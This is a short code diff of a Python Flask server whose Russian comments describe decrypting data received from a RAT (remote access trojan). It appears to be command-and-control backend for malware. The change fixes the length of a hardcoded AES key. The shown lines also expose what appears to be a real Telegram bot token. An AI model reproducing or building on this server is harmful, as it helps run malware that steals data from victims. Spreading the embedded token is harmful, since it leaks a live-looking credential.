@@ -13,7 +13,7 @@ CORS(app)
 
 # 🔐 ТВОЙ ТОКЕН И КЛЮЧ
 TOKEN = "8244921168:AAHRyemnt7kRBzSJT-QM6iExJHoPlDubgtM"
-AES_KEY = b'mysecretkey12345678901234567890'  # 32 байта
+AES_KEY = b'mysecretkey12345678901234567890x'  # 32 байта
 
 def decrypt_aes(encrypted_b64):
     """Расшифровка данных от RAT"""
@@ -87,3 +87,4 @@ def health():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
+
